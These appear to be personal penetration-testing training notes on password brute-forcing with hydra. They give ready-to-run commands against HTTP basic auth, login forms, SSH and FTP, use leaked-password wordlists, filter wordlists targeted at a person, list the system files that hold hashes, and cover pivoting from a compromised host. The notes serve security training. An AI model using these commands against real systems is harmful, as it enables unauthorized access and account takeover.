

- list of file that contains hash passwords

| **`Windows`** | **`Linux`** |
| ------------- | ----------- |
| unattend.xml  | shadow      |
| sysprep.inf   | shadow.bak  |
| SAM           | password    |


## Basic HTTP Auth Bruteforcing

### Mechanism
```
          +-----------------+                  +-----------------+
          |      Client     |                  |      Server     |
          +-----------------+                  +-----------------+
                   |                                 |
                   | 1. Initial Request (No Auth)    |
                   |-------------------------------->|
                   |                                 |
                   |                                 | 2. Response with
                   |                                 |    WWW-Authenticate
                   |                                 |    header (realm)
                   |<--------------------------------|
                   |                                 |
                   | 3. Request with                 |
                   |    Authorization header         |
                   |    (Base64-encoded ID:Password) |
                   |-------------------------------->|
                   |                                 |
                   |                                 | 4. Server verifies
                   |                                 |    credentials
                   |                                 |    (if valid, grant access)
                   |                                 |
                   |<--------------------------------|
                   |                                 |
                   | 5. Access Granted /             |
                   |    Requested Resource           |
                   |                                 |
				   |---------------------------------|
```

![[Pasted image 20240611185303.png]]


- If Your wordlist contains `username:password` format use -C flag

| **Options**                        | **Description**               |
| ---------------------------------- | ----------------------------- |
| `-C ftp-betterdefaultpasslist.txt` | Combined Credentials Wordlist |
| `SERVER_IP`                        | Target IP                     |
| `-s PORT`                          | Target Port                   |
| `http-get`                         | Request Method                |
| `/`                                | Target Path                   |


```shell
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```


#### Bruteforce Both Username & Password

```shell
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```

`-L` flag for the usernames
`-P` flag for the passwords wordlist
`-u` flag, so that it tries all users on each password


### Bruteforce Username or Password

- specify the known value with lowercase flag , if username is known `-l` or if password is known `-p`

```shell-session
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```

## Web Forms Brute Forcing

- two types of `http` modules  :
	1. `http[s]-{head|get|post}`
	2. `http[s]-post-form`


```shell
/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]
```


 **Fail/Success String**

|**Type**|**Boolean Value**|**Flag**|
|---|---|---|
|`Fail`|FALSE|`F=html_content`|
|`Success`|TRUE|`S=html_content`|

-  pick the login button, as it is fairly safe to assume that there will be no login button after logging in FOR FAIL

```bash
"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
```


### Determine Login Parameters


##### Using Web Browser

![[Pasted image 20240611191910.png]]
- copy post data


**Using Burpsuite**

![[Pasted image 20240611192038.png]]



- in this case our payload would be

```bash
"/login.php:user=^USER^&pass=^PASS^:F=<form name='login'"
```




```shell
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f http://94.237.54.201/ -s 50064 http-post-form "/admin_login.php:username=^USER^&password=^PASS^:F=<form name='log-in'"
```


## Personalized Wordlists


- need to collect some information about them


### CUPP
- `Cupp` is very easy to use
- interactive mode using `-i`

- password must meet the following conditions:
	1. 8 characters or longer
	2. contains special characters
	3. contains numbers


```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```




## Service Authentication Brute Forcing

- provide the username/password wordlists, and add `service://SERVER_IP:PORT` at the end


```shell
hydra -l b.gates -P /opt/usefull/SecLists/Passwords/Leaked-Databases/rockyou-10.txt -u -f ssh://94.237.54.201:22 -t 4
```

- use this password to login ssh , if ftp is running inside and hydra is installed in victim machine . run hydra
```shell
hydra -l g.potter -P rockyou-30.txt ftp://127.0.0.1
```

if not port forward to local machine




